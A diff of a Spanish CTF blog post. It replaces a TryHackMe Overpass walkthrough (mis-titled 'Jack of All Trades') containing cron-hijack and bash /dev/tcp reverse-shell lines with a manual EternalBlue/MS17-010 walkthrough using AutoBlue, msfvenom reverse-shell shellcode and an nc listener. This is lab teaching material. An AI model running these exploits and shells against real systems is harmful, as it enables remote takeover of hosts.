@@ -1,9 +1,9 @@
 ---
-title: TryHackMe Jack of All Trades Writeup
-published: false
+title: EternalBlue - MS17-010 - Manual Exploitation
+published: true
 ---
 
-La máquina Jack of All Trades es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.
+En esta entrada veremos como explotar de manera manual (GitHub) un Eternal Blue. Para ello he usado la máquina Blue de TryHackMe pero también se podría realizar con la de HackTheBox. No nos centraremos en la resolución de las preguntas que nos plantean ya que la mayoría se contestan al realizar la máquina mediante Metasploit.
 
 # [](#header-1)Enumeración
 
@@ -26,186 +26,221 @@ nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
 *  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts
 
 ```bash
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-18 12:32 EDT
-Initiating Ping Scan at 12:32
-Scanning 10.10.185.82 [2 ports]
-Completed Ping Scan at 12:32, 0.07s elapsed (1 total hosts)
-Initiating Connect Scan at 12:32
-Scanning 10.10.185.82 [65535 ports]
-Discovered open port 22/tcp on 10.10.185.82
-Discovered open port 80/tcp on 10.10.185.82
-Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 47.59% done; ETC: 12:32 (0:00:10 remaining)
-Completed Connect Scan at 12:32, 14.51s elapsed (65535 total ports)
-Nmap scan report for 10.10.185.82
-Host is up, received syn-ack (0.055s latency).
-Scanned at 2022-10-18 12:32:25 EDT for 15s
-Not shown: 56239 closed tcp ports (conn-refused), 9294 filtered tcp ports (no-response)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:37 EDT
+Initiating SYN Stealth Scan at 13:37
+Scanning 10.10.64.35 [65535 ports]
+Discovered open port 3389/tcp on 10.10.64.35
+Discovered open port 445/tcp on 10.10.64.35
+Discovered open port 139/tcp on 10.10.64.35
+Discovered open port 135/tcp on 10.10.64.35
+Discovered open port 49152/tcp on 10.10.64.35
+Discovered open port 49158/tcp on 10.10.64.35
+Discovered open port 49153/tcp on 10.10.64.35
+Discovered open port 49159/tcp on 10.10.64.35
+Discovered open port 49154/tcp on 10.10.64.35
+Completed SYN Stealth Scan at 13:37, 13.81s elapsed (65535 total ports)
+Nmap scan report for 10.10.64.35
+Host is up, received user-set (0.050s latency).
+Scanned at 2022-10-28 13:37:46 EDT for 13s
+Not shown: 65156 closed tcp ports (reset), 370 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack
-80/tcp open  http    syn-ack
+PORT      STATE SERVICE       REASON
+135/tcp   open  msrpc         syn-ack ttl 127
+139/tcp   open  netbios-ssn   syn-ack ttl 127
+445/tcp   open  microsoft-ds  syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127
+49152/tcp open  unknown       syn-ack ttl 127
+49153/tcp open  unknown       syn-ack ttl 127
+49154/tcp open  unknown       syn-ack ttl 127
+49158/tcp open  unknown       syn-ack ttl 127
+49159/tcp open  unknown       syn-ack ttl 127
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds
+Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
+           Raw packets sent: 70436 (3.099MB) | Rcvd: 65185 (2.607MB)
 ```
 
-Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra el servicio Apache que está corriendo. Inspeccionamos el código de la página pero no encontramos nada.
-
-Usaremos gobuster para obtener directorios ocultos:
+Realizaremos un escaneo del puerto 445 ya que sabemos que la máquina va dirigida a Eternal Blue. Nos reporta: 
 
 ```bash
+❯ nmap -p445 -sCV 10.10.64.35 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:45 EDT
+Nmap scan report for 10.10.64.35
+Host is up (0.061s latency).
 
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+| smb2-time: 
+|   date: 2022-10-28T17:46:01
+|_  start_date: 2022-10-28T17:32:02
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:f9:a0:56:45:49 (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-10-28T12:46:01-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
+[1]    7547 segmentation fault  nmap -p445 -sCV 10.10.64.35 -oN targeted
 ```
 
-Encontramos directorios ocultos en los que están el panel de autentificación y dos o tres más.
+Esto quiere decir que como estamos bajo a Windows 7 professional. Como el smb está expuesto (puerto 445) tenemos una vía potencial de acceso al sistema.
 
-# [](#header-1)Acceso al sistema
-
-Tras investigar un poco nos fijamos en el código del panel de login. En el apartado de JavaScript podemos ver al final del código que exite una cookie. Para intentar acceder con ella lo que deberemos hacer es dirigirnos al apartado de Storage y en Cookies darle a + para que se añada. Lo único que habrá que cambiar será el nombre. Aquí deberemos poner el de la propia cookie. En este caso SessionToken. Una vez añadida recargamos la página y nos muestra una clave RSA privada con un potencial usuario (James) pero está encriptada. 
-
-Lo que podemos hacer es convertir la clave privada a hash para después crackearla y conseguir la contraseña del usuario James. Para ello usaremos ssh2john. Antes habrá que copiar la clave privada en nuestro equipo bajo el nombre id_rsa y darle permiso con chmod (chmod 600 id_rsa). Usando ssh2john:
-
-> /usr/share/john/ssh2john.py id_rsa > overpass.txt
-
-Para obtener la contraseña podremos usar John ora vez:
+Con nmap podemos lanzar una serie de scripts, en este caso de la categoria Vuln, a la máquina víctima por el puerto 445:
 
 ```bash
-❯ /usr/sbin/john --wordlist=/home/jorge/Descargas/rockyou.txt overpass.txt
-Created directory: /home/jorge/.john
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
-Cost 2 (iteration count) is 1 for all loaded hashes
-Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-???????          (id_rsa)     
-1g 0:00:00:00 DONE (2022-10-16 14:40) 33.33g/s 445866p/s 445866c/s 445866C/s lespaul..handball
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:49 EDT
+Nmap scan report for 10.10.64.35
+Host is up (0.051s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
+[1]    8466 segmentation fault  nmap -script "vuln" -p445 10.10.64.35
 ```
 
-Nos muestra la contraseña. Intentaremos conectarnos por SSH con la clave privada y la contraseña descifrada:
+Es vulnerable al Eternal Blue. Buscamos un exploit en github sobre la vulnerabilidad. En mi caso voy a utilizar el de <a href="https://github.com/3ndG4me/AutoBlue-MS17-010"> 3ndG4me.</a>
+
+Hacemos un git clone para copiarnos el repositorio a nuestro sistema:
+
+> git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+
+Para comprobar si podemos acceder al sistema mediante Eternal Blue usamos el checker:
 
 ```bash
-❯ ssh -i id_rsa james@10.10.189.162
-Enter passphrase for key 'id_rsa': 
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun Oct 16 18:46:19 UTC 2022
-
-  System load:  0.08               Processes:           88
-  Usage of /:   22.3% of 18.57GB   Users logged in:     0
-  Memory usage: 13%                IP address for eth0: 10.10.189.162
-  Swap usage:   0%
-
-
-47 packages can be updated.
-0 updates are security updates.
-
-
-Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
-james@overpass-prod:~$ 
+❯ python eternal_checker.py 10.10.64.35
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
 ```
 
-Estamos dentro, conseguimos la flag del usuario:
+Como nos conforma que el sistema no está parcheado podemos continuar con el proceso.
+
+En la carpeta shellcode con chmod hacemos que shell_prep.sh sea ejecutable con:
+
+> chmod +x shell_prep.sh 
+
+Lo ejecutamos:
 
 ```bash
-james@overpass-prod:~$ ls -R
-.:
-todo.txt  user.txt
-james@overpass-prod:~$ cat user.txt 
-thm{????????????????????????}
+❯ sudo ./shell_prep.sh
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+10.8.4.179
+LPORT you want x64 to listen on:
+1234
+LPORT you want x86 to listen on:
+1234
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+Generating x64 cmd shell (stageless)...
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.8.4.179 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (stageless)...
+
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.8.4.179 LPORT=1234
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+
 ```
 
-# [](#header-1)Escalada de privilegios
+Creamod así sc_all.bin sc_x64.bin y algunos archivos más que podemos ejecutar dependiendo de la arquitectura del sistema Windows del que vamos a obtener acceso.
 
-No podemos realizar sudo -l para ver los comandos que podemos ejecutar como root. Abrimos el archivo todo.txt y nos reporta lo siguiente:
+Ahora debemos usar netcat para estar en escucha por el puerto antes indicado.
 
 ```bash
-james@overpass-prod:~$ cat todo.txt 
-To Do:
-> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
-> Write down my password somewhere on a sticky note so that I don't forget it.
-  Wait, we make a password manager. Why don't I just use that?
-> Test Overpass for macOS, it builds fine but I'm not sure it actually works
-> Ask Paradox how he got the automated build script working and where the builds go.
-  They're not updating on the website
+❯ nc -lnvp 1234
+listening on [any] 1234 ...
 ```
 
-De aquí podemos sacar que hay un proceso automatizado por lo que abro /etc/crontab y nos muestra: 
+En mi caso es un Windows 7 x64 bits por lo que ejecutaré sc_x64.bin junto con el exploit
 
 ```bash
-james@overpass-prod:~$ cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-# m h dom mon dow user  command
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-# Update builds from latest code
-* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+❯ python eternalblue_exploit7.py 10.10.64.35 shellcode/sc_x64.bin
+shellcode size: 1232
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
 ```
-
-Podemos observar que cada minuto se ejecuta un script en bash.
-
-Si tenemos permisos de escritura en /etc/host podemos realizar la reverse shell, lo comprobamos:
 
 ```bash
-james@overpass-prod:~$ ls -la /etc/hosts
--rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
+❯ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.8.4.179] from (UNKNOWN) [10.10.64.35] 49188
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
 ```
 
-Tenemos permisos. Modificamos la IP de overpass.thm en /etc/hosts poniendo nuestra IP
+Conseguimos acceso al sistema como nt authority\system
 
-Desde nuestro equipo, creamos la misma estructura de directorios y en el archivo buildscript.sh añadimos la bash reverse shell con nuestra IP y el puerto deseado.
-
-Es decir, creamos /downloads/src/ y dentro el archivo .sh
-
-En mi caso he usado la de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a>:
-
-> bash -i >& /dev/tcp/10.8.33.229/4444 0>&1
-
-También podríamos haber usado la de <a href="https://gtfobins.github.io/gtfobins/bash/#reverse-shell">GTFOBins</a>:
-
-> bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
-
-Ejecutamos un servidor local mediante:
-
-> python3 -m http.server 80
-
-Nos ponemos en escucha desde el puerto que hemos indicado y esperamos menos de un minuto (que es lo que tarda en ejecutarse la tarea crontab desde la máquina víctima)
-
-```bash
-❯ nc -lnvp 4444
-listening on [any] 4444 ...
-connect to [10.8.33.229] from (UNKNOWN) [10.10.189.162] 58330
-bash: cannot set terminal process group (3567): Inappropriate ioctl for device
-bash: no job control in this shell
-root@overpass-prod:~# ls
-ls
-buildStatus
-builds
-go
-root.txt
-src
-root@overpass-prod:~# cat root.txt
-cat root.txt
-thm{????????????????????????''}
-```
-
-Conseguimos acceso y obtenemos la flag de root! 
-
-Muchas gracias por leer este writeup, espero que te haya gustado!
+Muchas gracias por leer esta publicación, espero que te haya gustado!
